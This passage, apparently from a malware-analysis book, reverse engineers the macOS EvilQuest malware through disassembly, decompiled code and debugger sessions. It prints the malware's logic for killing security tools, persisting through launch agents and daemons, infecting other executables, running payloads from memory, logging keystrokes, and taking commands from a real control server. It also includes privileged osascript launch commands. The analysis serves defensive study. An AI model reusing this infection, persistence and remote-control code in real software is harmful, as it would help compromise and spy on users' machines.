["```\nint ei_persistence_main(...) {\n\n    if (is_debugging(...) != 0) {\n exit(1);\n    }\n    prevent_trace();\n    kill_unwanted(...);\n    persist_executable(...);\n    install_daemon(...);\n    install_daemon(...);\n    ei_selfretain_main(...);\n    ...\n}\n```", "```\n1 0x00000001000104d0  dd 0x00000001, 0x0000000e, 0x00000000\n\nget_process_list(void* processList, int* count) \n{\n\n 2 sysctl(0x1000104d0, 0x3, 0x0, &size, 0x0, 0x0); \n\n   void* buffer = malloc(size); \n\n 3 sysctl(0x1000104d0, 0x3, &buffer, &size, 0x0, 0x0);\n```", "```\n% **DYLD_INSERT_LIBRARIES/tmp/deobfuscator.dylib patch**\n...\ndecrypted string (0x10eb6893f): Little Snitch\ndecrypted string (0x10eb6895f): Kaspersky\ndecrypted string (0x10eb6897f): Norton\ndecrypted string (0x10eb68993): Avast\ndecrypted string (0x10eb689a7): DrWeb\ndecrypted string (0x10eb689bb): Mcaffee\ndecrypted string (0x10eb689db): Bitdefender\ndecrypted string (0x10eb689fb): Bullguard\n```", "```\n0x00000001000082fb    mov        rdi, qword [rbp+currentProcess]\n0x00000001000082ff    mov        rsi, rax   ;each item from EI_UNWANTED\n0x0000000100008302    call       strstr\n0x0000000100008307    cmp        rax, 0x0\n0x000000010000830b    je         noMatch\n\n0x0000000100008311    mov        edi, dword [rbp+currentProcessPID]\n0x0000000100008314    mov        esi, 0x9 \n1 0x0000000100008319    call       kill \n0x000000010000832e    mov        rdi, qword [rbp+currentProcess]\n0x0000000100008332    mov        esi, 0x29a \n2 0x0000000100008337    call       chmod \n```", "```\n# **lldb /Library/mixednkey/toolroomd**\n...\n(lldb) **b 0x100008319**\nBreakpoint 1: where = toolroomd`toolroomd[0x0000000100008319], address = 0x0000000100008319\n\n(lldb) **r**\n...\n\nProcess 1397 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1\n->  0x100008319: callq  0x10000ff2a  ;kill\n    0x10000831e: cmpl   $0x0, %eax\n\n(lldb) **reg read $rdi**\nrdi = 0x00000000000005b1 1\n(lldb) **reg read $rsi**\nrsi = 0x0000000000000009 2\n```", "```\n# **FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter toolroomd**\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n  \"file\" : {\n    \"destination\" : \"/Users/user/Library/AppQuest/com.apple.questd\",\n    \"process\" : {\n      ...\n      \"pid\" : 1505 \n      \"name\" : \"toolroomd\",\n      \"path\" : \"/Library/mixednkey/toolroomd\",\n    }\n  }\n}\n```", "```\n% **shasum /Library/mixednkey/toolroomd**\nefbb681a61967e6f5a811f8649ec26efe16f50ae\n\n% **shasum /Library/AppQuest/com.apple.questd**\nefbb681a61967e6f5a811f8649ec26efe16f50ae\n\n% **shasum ~/Library/AppQuest/com.apple.questd**\nefbb681a61967e6f5a811f8649ec26efe16f50ae\n```", "```\n# **lldb /Library/mixednkey/toolroomd**\n...\n\n(lldb) **b 0x0000000100009130**\nBreakpoint 1: where = toolroomd`toolroomd[0x0000000100009130], address = 0x0000000100009130\n\n(lldb) **c**\n\nProcess 1397 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1\n->  0x100009130: pushq  %rbp\n    0x100009131: movq   %rsp, %rbp\n\n(lldb) **x/s $rdi**\n0x7ffeefbffc94: \"/Users/user\"\n\n(lldb) **x/s $rsi**\n0x100114a20: \"%s/Library/AppQuest/com.apple.questd\"\n\n(lldb) **x/s $rdx**\n0x100114740: \"%s/Library/LaunchAgents/\" \n```", "```\n# **lldb /Library/mixednkey/toolroomd**\n...\n\n(lldb) **x/i $rip**\n-> 0x1000091bd: e8 5e 7a ff ff  callq  0x100000c20 ;ei_str\n\n(lldb) **ni**\n\n(lldb) **x/s $rax**\n0x100119540: \"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\\n<plist version=\"1.0\">\\n<dict>\\n<key>Label</key>\\n<string>%s</string>\\n\\n<key>ProgramArguments</key>\\n<array>\\n<string>%s</string>\\n<string>--silent</string>\\n</array>\\n\\n<key>RunAtLoad</key>\\n<true/>\\n\\n<key>KeepAlive</key>\\n<true/>\\n\\n</dict>\\n</plist>\"\n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>questd</string>\n\n    <key>ProgramArguments</key>\n    <array>\n        <string>/Users/user/Library/AppQuest/com.apple.questd</string>\n        <string>--silent</string>\n    </array>\n\n  1 <key>RunAtLoad</key>\n    <true/>\n\n    <key>KeepAlive</key>\n    <true/>\n</dict>\n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>questd</string>\n\n    <key>ProgramArguments</key>\n    <array>\n      1 <string>sudo</string>\n        <string>/Library/AppQuest/com.apple.questd</string>\n        <string>--silent</string>\n    </array>\n\n  2 <key>RunAtLoad</key>\n    <true/>\n\n    <key>KeepAlive</key>\n    <true/>\n\n</dict>\n```", "```\n% **ps aux | grep -i com.apple.questd**\nroot     97    sudo /Library/AppQuest/com.apple.questd --silent\nuser     541   /Users/user/Library/AppQuest/com.apple.questd –silent\n```", "```\nei_selfretain_main:\n0x000000010000b710    push       rbp\n0x000000010000b711    mov        rbp, rsp\n...\n0x000000010000b7a6    call       run_daemon \n...\n0x000000010000b7c8    call       run_daemon\n```", "```\n# **lldb /Library/mixednkey/toolroomd**\n...\n\nProcess 1397 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over\n->  0x10000b7a6: callq  run_daemon\n\n(lldb) **x/s $rdi**\n0x100212f90: \"%s/Library/LaunchAgents/\"\n\n(lldb) **x/s $rsi**\n0x100217b40: \"com.apple.questd.plist\"\n```", "```\nconstruct_plist_path:\n0x0000000100002900    push       rbp\n0x0000000100002901    mov        rbp, rsp\n...\n0x0000000100002951    lea        rax, qword [aSs_10001095a]    ; \"%s/%s\"\n0x0000000100002958    mov        qword [rbp+format], rax\n...\n0x00000001000029a9    xor        esi, esi\n0x00000001000029ab    mov        rdx, 0xffffffffffffffff\n0x00000001000029b6    mov        rdi, qword [rbp+path]\n0x00000001000029ba    mov        rcx, qword [rbp+format]\n0x00000001000029be    mov        r8, qword [rbp+arg_1]\n0x00000001000029c2    mov        r9, qword [rbp+arg_2]\n\n1 0x00000001000029c8    call       sprintf_chk\n```", "```\nosascript -e \"do shell script \\\"launchctl load -w %s;launchctl start %s\\\" \nwith administrator privileges\"\n```", "```\n**# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty**\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n  \"process\" : {\n    ...\n    \"id\" : 0,\n    \"arguments\" : [\n    1 \"osascript\", \n      \"-e\",\n    2 \"do shell script \\\"launchctl load -w \n       /Library/LaunchDaemons/com.apple.questd.plist\n       launchctl start questd\\\" with administrator privileges\"\n    ],\n    \"pid\" : 1579,\n    \"name\" : \"osascript\",\n    \"path\" : \"/usr/bin/osascript\"\n  }\n}\n```", "```\n# **lldb /Library/mixednkey/toolroomd**\n...\n\n(lldb)**b 0x000000010000d520**\nBreakpoint 1: where = toolroomd`toolroomd[0x000000010000D520], address = 0x000000010000D520\n\n(lldb) **c**\n...\n\nProcess 1397 stopped\n* thread #2, stop reason = breakpoint 1.1\n-> 0x10000d520: 55        pushq  %rbp\n   0x10000d521: 48 89 e5  movq   %rsp, %rbp\n\n(lldb) **p ((char**)$rdi)[0]**\n0x0000000100305e60 \"/Library/AppQuest/com.apple.questd\"\n(lldb) **p ((char**)$rdi)[1]**\n0x0000000100305e30 \"/Users/user/Library/AppQuest/com.apple.questd\"\n(lldb) **p ((char**)$rdi)[2]**\n0x0000000100305ee0 \"/Library/LaunchDaemons/com.apple.questd.plist\"\n(lldb) **p ((char**)$rdi)[3]**\n0x0000000100305f30 \"/Users/user/Library/LaunchAgents/com.apple.questd.plist\"\n```", "```\n# **rm /Library/LaunchDaemons/com.apple.questd.plist**\n# **ls /Library/LaunchDaemons/com.apple.questd.plist**\nls: /Library/LaunchDaemons/com.apple.questd.plist: No such file or directory\n\n# **FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter com.apple.questd.plist**\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_WRITE\", \n  \"file\" : {\n    \"destination\" : \"/Library/LaunchDaemons/com.apple.questd.plist\",\n    \"process\" : {\n      \"path\" : \"/Library/mixednkey/toolroomd\",\n      \"name\" : \"toolroomd\",\n      \"pid\" : 1369\n    }\n  }\n}\n\n# **ls /Library/LaunchDaemons/com.apple.questd.plist**\n**/Library/LaunchDaemons/com.apple.questd.plist**\n```", "```\n int _ei_loader_main(...) {\n  ...\n\n  *(args + 0x8) = 1 ei_str(\"26aC391KprmW0000013\");\n\n  pthread_create(&threadID, 0x0, 2 ei_loader_thread, args);\n```", "```\nint ei_loader_thread(void* arg0) {\n    ...\n    result = get_targets(*(arg0 + 0x8), &targets, &count, is_executable); \n    if (result == 0x0) {\n          for (i = 0x0; i < count; i++) {\n               if (append_ei(arg0, targets[i]) == 0x0) {\n                     infectedFiles++;\n               }\n          }\n    }\n\n    return infectedFiles;\n}\n```", "```\n0x0000000100004acc    mov       rdi, qword [rbp+path]\n0x0000000100004ad0    lea       rsi, qword [aApp]         ; \".app/\" 1\n0x0000000100004ad7    call      strstr 2\n0x0000000100004adc    cmp       rax, 0x0                  ; substring not found\n0x0000000100004ae0    je        continue\n0x0000000100004ae6    mov       dword [rbp+result], 0x0 3\n0x0000000100004aed    jmp       leave\n```", "```\nstream = fopen(path, \"rb\");\nif (stream == 0x0) {\n   result = -1;\n}\nelse {\n   rax = fread(&bytesRead, 0x1c, 0x1, stream);\n```", "```\nfseek(stream, 0x0, 0x2);\nsize = ftell(stream);\nif (size > 0x1900000) {\n    result = 0x0;\n}\n```", "```\n0x0000000100004b8d    cmp       dword [rbp+header.magic], 0xfeedface \n0x0000000100004b94    je        continue\n0x0000000100004b9a    cmp       dword [rbp+header.magic], 0xcefaedfe\n0x0000000100004ba1    je        continue\n0x0000000100004ba7    cmp       dword [rbp+header.magic], 0xfeedfacf\n0x0000000100004bae    je        continue\n0x0000000100004bb4    cmp       dword [rbp+header.magic], 0xcffaedfe\n0x0000000100004bbb    jne       leave\n```", "```\n0x0000000100004bc1    cmp       dword [rbp+header.filetype], 0x2\n0x0000000100004bc5    jne       leave\n0x0000000100004bcb    mov       dword [rbp+result], 0x1\n```", "```\n# **lldb /Library/mixednkey/toolroomd**\n...\n\n(lldb)**b 0x0000000100004bf0**\nBreakpoint 1: where = toolroomd`toolroomd[0x0000000100004bf0], address = 0x0000000100004bf0\n\n(lldb) **c**\n\nProcess 1369 stopped\n* thread #3, stop reason = breakpoint 1.1\n(lldb) **x/s $rdi**\n0x7ffeefbffcf0: \"/Library/mixednkey/toolroomd\"\n\n(lldb) **x/s $rsi**\n0x100323a30: \"/Users/user/HelloWorld\"\n```", "```\nif(0 != stat(targetPath, &buf) )\n{\n    return -1;\n}\n```", "```\nFILE* src = fopen(sourceFile, \"rb\");\n\nfseek(src, 0, SEEK_END);\nint srcSize = ftell(src);\nfseek(src, 0, SEEK_SET);\n\nchar* srcBytes = malloc(srcSize);\nfread(srcBytes, 0x1, srcSize, src);\n```", "```\n1 FILE* target = fopen(targetFile, \"rb+\"); \n\nfseek(target, 0, SEEK_END);\nint targetSize = ftell(target);\nfseek(target, 0, SEEK_SET);\n\nchar* targetBytes = malloc(targetSize);\nfread(targetBytes, 0x1, targetSize, target);\n```", "```\n0x0000000100004e6a    call       unpack_trailer\n0x0000000100004e6f    mov        qword [rbp+trailerData], rax\n\n0x0000000100004e82    cmp        qword [rbp+trailerData], 0x0\n0x0000000100004e8a    je         continue\n...\n0x0000000100004eb4    mov        dword [rbp+result], 0x0\n0x0000000100004ec1    jmp        leave\n\ncontinue:\n0x0000000100004ec6    xor        eax, eax\n```", "```\nfwrite(srcBytes, 0x1, srcSize, target);\n\nfwrite(targetBytes, 0x1, targetSize, target);\n```", "```\nint* trailer = malloc(0xC);\n\ntrailer[0] = 0x3;\ntrailer[1] = srcSize;\ntrailer[2] = 0xDEADFACE;\npackedTrailer = packTrailer(&trailer, 0x0);\n\nfwrite(packedTrailer, 0x1, 0xC, target);\n```", "```\n% **hexdump -C HelloWorld**\n\n00000000  cf fa ed fe 07 00 00 01  03 00 00 80 02 00 00 00  |................|\n00000010  12 00 00 00 c0 07 00 00  85 00 20 04 00 00 00 00  |.......... .....|\n00000020  19 00 00 00 48 00 00 00  5f 5f 50 41 47 45 5a 45  |....H...__PAGEZE|\n00000030  52 4f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |RO..............|\n\n00015770  cf fa ed fe 07 00 00 01  03 00 00 00 02 00 00 00  |................| 1\n00015780  14 00 00 00 08 07 00 00  85 00 20 00 00 00 00 00  |.......... .....|\n00015790  19 00 00 00 48 00 00 00  5f 5f 50 41 47 45 5a 45  |....H...__PAGEZE|\n000157a0  52 4f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |RO..............|\n\n000265b0  03 70 57 01 00 ce fa ad  de                       |.pW......| 2\n```", "```\n;unpack_trailer\n;rcx: trailer data\n0x0000000100004a39    cmp       dword ptr [rcx+8], 0xdeadface\n0x0000000100004a40    mov       [rbp+var_38], rax\n0x0000000100004a44    jz        isInfected\n```", "```\nmaliciousBytes = extract_ei(argv, &size);\nif (maliciousBytes != 0x0) {\n    persist_executable_frombundle(maliciousBytes, size, ...);\n    install_daemon(...);\n    run_daemon(...);\n    ...\n```", "```\n% **lldb ~/HelloWorld**\n...\n\nProcess 1209 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over\n    frame #0: 0x000000010000bee7 HelloWorld\n->  0x10000bee7: callq  persist_executable_frombundle \n\n(lldb) **reg read**\nGeneral Purpose Registers:\n       ...\n       rdi = 0x0000000100128000 1\n       rsi = 0x0000000000015770 2\n\n(lldb) **x/10wx $rdi**\n0x100128000: 0xfeedfacf 0x01000007 0x80000003 0x00000002\n0x100128010: 0x00000012 0x000007c0 0x04200085 0x00000000\n0x100128020: 0x00000019 0x00000048\n```", "```\n# **FileMonitor.app/Contents/MacOS/FileMonitor -pretty –filter HelloWorld**\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n  \"file\" : {\n    \"destination\" : \"/Users/user/Library/AppQuest/com.apple.questd\",\n    \"process\" : {\n      \"uid\" : 501,\n      \"path\" : \"/Users/user/HelloWorld\",\n      \"name\" : \"HelloWorld\",\n      \"pid\" : 1209\n      ...\n     }\n  }\n}\n\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n  \"file\" : {\n    \"destination\" : \"/Users/user/Library/LaunchAgents/com.apple.questd.plist\",\n    \"process\" : {\n      \"uid\" : 501,\n      \"path\" : \"/Users/user/HelloWorld\",\n \"name\" : \"HelloWorld\",\n      \"pid\" : 1209\n      ...\n     }\n  }\n}\n```", "```\n# **ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty**\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n  \"process\" : {\n    \"uid\" : 501,\n    \"arguments\" : [\n      \"launchctl\",\n      \"submit\",\n      \"-l\",\n      \"questd\",\n      \"-p\",\n      \"/Users/user/Library/AppQuest/com.apple.questd\"\n    ],\n    \"name\" : \"launchctl\",\n    \"pid\" : 1309\n  }\n}\n\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n  \"process\" : {\n    \"uid\" : 501,\n    \"path\" : \"/Users/user/Library/AppQuest/com.apple.questd\",\n    \"name\" : \"com.apple.questd\",\n    \"pid\" : 1310\n  }\n}\n```", "```\n1 file = fopen(newPath, \"wb\");\nfwrite(bytes, 0x1, size, file);\nfclose(file);\n\nchmod(newPath, mode);\n2 execl(newPath, 0x0); \n```", "```\n# **ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty**\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n  \"process\" : {\n    \"uid\" : 501,\n    \"path\" : \"/Users/user/.HelloWorld1\",\n    \"name\" : \".HelloWorld1\",\n    \"pid\" : 1209\n  }\n}\n```", "````Examining the malware’s disassembly turns up several cross references to the `get_mediator` function. The code prior to these calls references the server and file. Unsurprisingly, both are encrypted ([Listing 11-41](#listing11-41)):    ``` 0x00000001000016bf    lea        rdi, qword [a3ihmvk0rfo0r3k] 0x00000001000016c6    call       ei_str  0x00000001000016cb    lea        rdi, qword [a1mnsh21anlz906] 0x00000001000016d2    mov        qword [rbp+URL], rax 0x00000001000016d9    call       _ei_str  0x00000001000016de    mov        rdi, qword [rbp+URL] 0x00000001000016e5    mov        rsi, rax 0x00000001000016e8    call       get_mediator ```    Listing 11-41: Argument initializations and a call to the `get_mediator` function    Using a debugger or our injectable *deobfuscator dylib* discussed in Chapter 10, we can easily retrieve the plaintext for these strings:    ``` 3iHMvK0RFo0r3KGWvD28URSu06OhV61tdk0t22nizO3nao1q0000033 -> andrewka6.pythonanywhere 1MNsh21anlz906WugB2zwfjn0000083 -> ret.txt ```    You could also run a network sniffer such as Wireshark to passively capture the network request in action and reveal both the server and filename. Once the HTTP request to *andrewka6.pythonanywhere* for the file *ret.txt* completes, the malware will have the address of its command and control server. At the time of the malware’s discovery in mid-2020, this address was `167.71.237.219`.    If the HTTP request fails, EvilQuest has a backup plan. The `get_mediator` function’s main caller is the `eiht_get_update` function, which we’ll cover in the following section. Here, we’ll just note that the function will fall back to a hardcoded command and control server if the call to `get_mediator` fails ([Listing 11-42](#listing11-42)):    ``` eiht_get_update() {  ...   if(*mediated == NULL) {      *mediated  = get_mediator(url, page);     if (*mediated == 0x0) {          //167.71.237.219  *mediated = ei_str(\"1utt{h1QSly81vOiy83P9dPz0000013\");     }     ... ```    Listing 11-42: Fallback logic for a backup command and control server    The hardcoded address of the command and control server, `167.71.237.219`, matches the one found online in the *ret.txt* file.    ### Remote Tasking Logic    A common feature of persistent malware is the ability to accept commands remotely from an attacker and run them on the victim system. It’s important to figure out what commands the malware supports in order to gauge the full impact of an infection. Though EvilQuest only supports a small set of commands, these are enough to afford a remote attacker complete control of an infected system. Interestingly, some the commands appear to be placeholders for now, as they are unimplemented and return `0` if invoked.    The tasking logic starts in the main function, where another function named `eiht_get_update` is invoked. This function first attempts to retrieve the address of the attacker’s command and control server via a call to `get_mediator`. If this call fails, the malware will fall back to using the hardcoded address we identified in the previous section.    The malware then gathers basic host information via a function named `ei_get_host_info`. Looking at the disassembly of this function ([Listing 11-43](#listing11-43)) reveals it invokes macOS APIs like `uname`, `getlogin`, and `gethostname` to generate a basic survey of the infected host:    ``` ei_get_host_info: 0x0000000100005b00    push       rbp  0x0000000100005b01    mov        rbp, rsp ... 0x0000000100005b1d    call       uname  ... 0x0000000100005f18    call       getlogin  ... 0x0000000100005f4a    call       gethostname ```    Listing 11-43: The `ei_get_host_info` survey logic    In a debugger, we can wait until the `ei_get_host_info` function is about to execute the `retq` instruction 1 in order to return to its caller and then dump the survey data it has collected ([Listing 11-44](#listing11-44)) 2:    ``` (lldb) **x/i $rip** 1 ->  0x100006043: c3  retq   2 (lldb) **p ((char**)$rax)[0]**  0x0000000100207bb0 \"user[(null)]\" (lldb) **p ((char**)$rax)[1]** 0x0000000100208990 \"Darwin 19.6\\. (x86_64) US-ASCII yes-no\" ```    Listing 11-44: Dumping the survey    The survey data is serialized via a call to a function named `eicc_serialize_request` (implemented at `0x0000000100000d30`) before being sent to the attacker’s command and control server by the `http_request` function. At `0x000000010000b0a3` we find a call to a function named `eicc_deserialize_request`, which deserializes the response from the server. A call to the `eiht_check_command` function (implemented at `0x000000010000a9b0`) validates the response, which should be a command to execute.    Interestingly, it appears that some information about the received command, perhaps a checksum, is logged to a file called *.shcsh* by means of a call to the `eiht_append_command` function ([Listing 11-45](#listing11-45)):    ``` int eiht_append_command(int arg0, int arg1) {     checksum = ei_tpyrc_checksum(arg0, arg1);    ...    file = fopen(\".shcsh\", \"ab\");    fseek(var_28, 0x0, 0x2);    fwrite(&checksum, 0x1, 0x4, file);    fclose(file);    ... } ```    Listing 11-45: Perhaps a cache of received commands?    Finally, `eiht_get_update` invokes a function named `dispatch` to handle the command. Reverse engineering the `dispatch` function, found at `0x000000010000a7e0`, reveals support for seven commands. Let’s detail each of these.    ### react_exec (0x1)    If the command and control server responds with the command `0x1` 1, the malware will invoke a function named `react_exec` 2, as shown in [Listing 11-46](#listing11-46):    ``` dispatch: 0x000000010000a7e0    push 0x000000010000a7e1    mov       rbp, rsp ...  0x000000010000a7e8    mov       qword [rbp+ptrCommand], rdi ... 0x000000010000a7fe    mov       rax, qword [rbp+ptrCommand] 0x000000010000a802    mov       rax, qword [rax] 1 0x000000010000a805    cmp       dword [rax], 0x1  0x000000010000a808    jne       continue 0x000000010000a80e    mov       rdi, qword [rbp+ptrCommand] 2 0x000000010000a812    call      react_exec  ```    Listing 11-46: Invocation of the `react_exec` function    The `react_exec` command will execute a payload received from the server. Interestingly, `react_exec` attempts to first execute the payload directly from memory. This ensures that the payload never touches the infected system’s filesystem, providing a reasonable defense against antivirus scanning and forensics tools.    To execute the payload from memory, `react_exec` calls a function named `ei_run_memory_hrd`, which invokes various Apple APIs to load and link the in-memory payload. Once the payload has been prepared for in-memory execution, the malware will execute it ([Listing 11-47](#listing11-47)):    ``` ei_run_memory_hrd: 0x0000000100003790    push       rbp  0x0000000100003791    mov        rbp, rsp ...  0x0000000100003854    call       NSCreateObjectFileImageFromMemory ... 0x0000000100003973    call       NSLinkModule ... 0x00000001000039aa    call       NSLookupSymbolInModule ... 0x00000001000039da    call       NSAddressOfSymbol ... 0x0000000100003a11    call       rax ```    Listing 11-47: The `ei_run_memory_hrd`’s in-memory coded execution logic    In my BlackHat 2015 talk “Writing Bad @$$ Malware for OS X,” I discussed this same in-memory code execution technique and noted that Apple used to host similar sample code.^([3](#c11-endnote-3)) The code in EvilQuest’s `react_exec` function seems to be directly based on Apple’s code. For example, both Apple’s code and the malware use the string `\"[Memory Based Bundle]\"`.    However, it appears there is a bug in the malware’s “run from memory” logic ([Listing 11-48](#listing11-48)):    ``` 000000010000399c    mov       rdi, qword [module] 00000001000039a3    lea       rsi, qword [a2l78i0wi...]     ;\"_2l78|i0Wi0rn2YVsFe3...\" 00000001000039aa    call      NSLookupSymbolInModule ```    Listing 11-48: A bug in the malware’s code    Notice that the malware author failed to deobfuscate the symbol via a call to `ei_str` before passing it to the `NSLookupSymbolInModule` API. Thus, the symbol resolution will fail.    If the in-memory execution fails, the malware contains backup logic and instead writes out the payload to a file named *.xookc*, sets it to be executable via `chmod`, and then executes via the following:    ``` osascript -e \"do shell script \\\"sudo open .xookc\\\" with administrator privileges\" ```    ### react_save (0x2)    The `0x2` command causes the malware to execute a function named `react_save`. This function downloads an executable file from the command and control server to the infected system.    Take a look at the decompiled code of this function in [Listing 11-49](#listing11-49), which is implemented at `0x000000010000a300`. We can see it first decodes data received from the server via a call to the `eib_decode` function. Then it saves this data to a file with a filename specified by the server. Once the file is saved, `chmod` is invoked with `0x1ed` (or `0755` octal), which sets the file’s executable bit.    ``` int react_save(int arg0) {     ...     decodedData = eib_decode(...data from server...);     file = fopen(name, \"wb\");     fwrite(decodedData, 0x1, length, file);     fclose(file);     chmod(name, 0x1ed);     ... ```    Listing 11-49: The core logic of the `react_save` function    ### react_start (0x4)    If EvilQuest receives command `0x4` from the server, it invokes a method named `react_start`. However, this function is currently unimplemented and simply sets the `EAX` register to `0` via the XOR instruction 1 ([Listing 11-50](#listing11-50)):    ``` dispatch: 0x000000010000a7e0    push 0x000000010000a7e1    mov        rbp, rsp ...  0x000000010000a826    cmp        dword [rax], 0x4 0x000000010000a829    jne        continue 0x000000010000a82f    mov        rdi, qword [rbp+var_10] 0x000000010000a833    call       react_start  react_start: 0x000000010000a460    push       rbp 0x000000010000a461    mov        rbp, rsp 0x000000010000a464    xor      1 eax, eax 0x000000010000a466    mov        qword [rbp+var_8], rdi 0x000000010000a46a    pop        rbp 0x000000010000a46b    ret ```    Listing 11-50: The `react_start` function remains unimplemented    In future versions of the malware, perhaps we’ll see completed versions of this (and the other currently unimplemented) commands.    ### react_keys (0x8)    If EvilQuest encounters command `0x8`, it will invoke a function named `react_keys`, which kicks off keylogging logic. A closer look at the disassembly of the `react_keys` function reveals it spawns a background thread to execute a function named `eilf_rglk_watch_routine`. This function invokes various CoreGraphics APIs that allow a program to intercept user keypresses ([Listing 11-51](#listing11-51)):    ``` eilf_rglk_watch_routine: 0x000000010000d460    push       rbp  0x000000010000d461    mov        rbp, rsp ...  0x000000010000d48f    call       CGEventTapCreate ... 0x000000010000d4d2    call       CFMachPortCreateRunLoopSource ... 0x000000010000d4db    call       CFRunLoopGetCurrent  ... 0x000000010000d4f1    call       CFRunLoopAddSource ... 0x000000010000d4ff    call       CGEventTapEnable ... 0x000000010000d504    call       CFRunLoopRun ```    Listing 11-51: Keylogger logic, found within the `eilf_rglk_watch_routine` function    Specifically, the function creates an event tap via the `CGEventTapCreate` API, adds it to the current run loop, and then invokes the `CGEventTapEnable` to activate the event tap. Apple’s documentation for `CGEventTapCreate` specifies that it takes a user-specified callback function that will be invoked for each event, such as a keypress.^([4](#c11-endnote-4)) As this callback is the `CGEventTapCreate` function’s fifth argument, it will be passed in the `R8` register ([Listing 11-52](#listing11-52)):    ``` 0x000000010000d488    lea       r8, qword [process_event]  0x000000010000d48f    call      CGEventTapCreate ```    Listing 11-52: The callback argument for the `CGEventTapCreate` function    Taking a peek at the malware’s `process_event` callback function reveals it’s converting the keypress (a numeric key code) to a string via a call to a helper function named `kconvert`. However, instead of logging this captured keystroke or exfiltrating it directly to the attacker, it simply prints it out locally ([Listing 11-53](#listing11-53)):    ``` int process_event(...) {    ...     keycode = kconvert(CGEventGetIntegerValueField(keycode, 0x9) & 0xffff);    printf(\"%s\\n\", keycode); ```    Listing 11-53: The keylogger’s callback function, `process_event`    Maybe this code is still a work in progress.    ### react_ping (0x10)    The next command, `react_ping`, is invoked if the malware receives a `0x10` from the server ([Listing 11-54](#listing11-54)). The `react_ping` first decrypts the encrypted string, `\"1|N|2P1RVDSH0KfURs3Xe2Nd0000073\"`, and then compares it with a string it has received from the server:    ``` react_ping: 0x000000010000a500    push      rbp         0x000000010000a501    mov       rbp, rsp ...  0x000000010000a517    lea       rax, qword [a1n2p1rvdsh0kfu] ; \"1|N|2P1RVDS...\" ... 0x000000010000a522    mov       rdi, rax 0x000000010000a525    call      ei_str  ... 0x000000010000a52c    mov       rdi, qword [rbp+strFromServer] 0x000000010000a530    mov       rsi, rax 0x000000010000a536    call      strcmp ... ```    Listing 11-54: The core logic of the `react_ping` function    Using our decryptor library, or a debugger, we can decrypt the string, which reads “Hi there.” If the server sends the “Hi there” message to the malware, the string comparison will succeed, and `react_ping` will return a success. Based on this command’s name and its logic, it is likely used by the remote attack to check the status (or availability) of an infected system. This is, of course, rather similar to the popular `ping` utility, which can be used to test the reachability of a remote host.    ### react_host (0x20)    Next we find logic to execute a function named `react_host` if a `0x20` is received from the server. However, as was the case with the `react_start` function, `react_host` is currently unimplemented and simply returns `0x0`.    ### react_scmd (0x40)    The final command supported by EvilQuest invokes a function named `react_scmd` in response to a `0x40` from the server ([Listing 11-55](#listing11-55)):    ``` react_scmd: 0x0000000100009e80    push       rbp 0x0000000100009e81    mov        rbp, rsp ...  0x0000000100009edd    mov        rdi, qword [command] 0x0000000100009ee1    lea        rsi, qword [mode] 0x0000000100009eec    call       popen ... 0x0000000100009f8e    call       fread ... 0x000000010000a003    call       eicc_serialize_request ... 0x000000010000a123    call       http_request ```    Listing 11-55: The core logic of the `react_scmd` function    This function will execute a command specified by the server via the `popen` API. Once the command has been executed, the output is captured and transmitted to the server via the `eicc_serialize_request` and `http_request` functions.    This wraps up the analysis of EvilQuest’s remote tasking capabilities. Though some of the commands appear incomplete or unimplemented, others afford a remote attacker the ability to download additional updates or payloads and execute arbitrary commands on an infected system.    ## The File Exfiltration Logic    One of EvilQuest’s main capabilities is the exfiltration of a full directory listing and files that match a hardcoded list of regular expressions. In this section we’ll analyze the relevant code to understand this logic.    ### Directory Listing Exfiltration    Starting in the main function, the malware creates a background thread to execute a function named `ei_forensic_thread`, as shown in [Listing 11-56](#listing11-56):    ``` rax = pthread_create(&thread, 0x0, ei_forensic_thread, &args); if (rax != 0x0) {    printf(\"Cannot create thread!\\n\");    exit(-1); }  ```    Listing 11-56: Executing the `ei_forensic_thread` function via a background thread    The `ei_forensic_thread` function first invokes the `get_mediator` function, described in the previous section, to determine the address of the command and control server. It then invokes a function named `lfsc_dirlist`, passing in an encrypted string (that decrypts to `\"/Users\"`), as seen in [Listing 11-57](#listing11-57):    ``` 0x000000010000170a    mov        rdi, qword [rbp+rax*8+var_30] 0x000000010000170f    call       ei_str ... 0x0000000100001714    mov        rdi, qword [rbp+var_10] 0x0000000100001718    mov        esi, dword [rdi+8] 0x000000010000171b    mov        rdi, rax 0x000000010000171e    call       lfsc_dirlist ```    Listing 11-57: Invoking the `lfsc_dirlist` function    The `lfsc_dirlist` function performs a recursive directory listing, starting at a specified root directory and searching each of its files and directories. After we 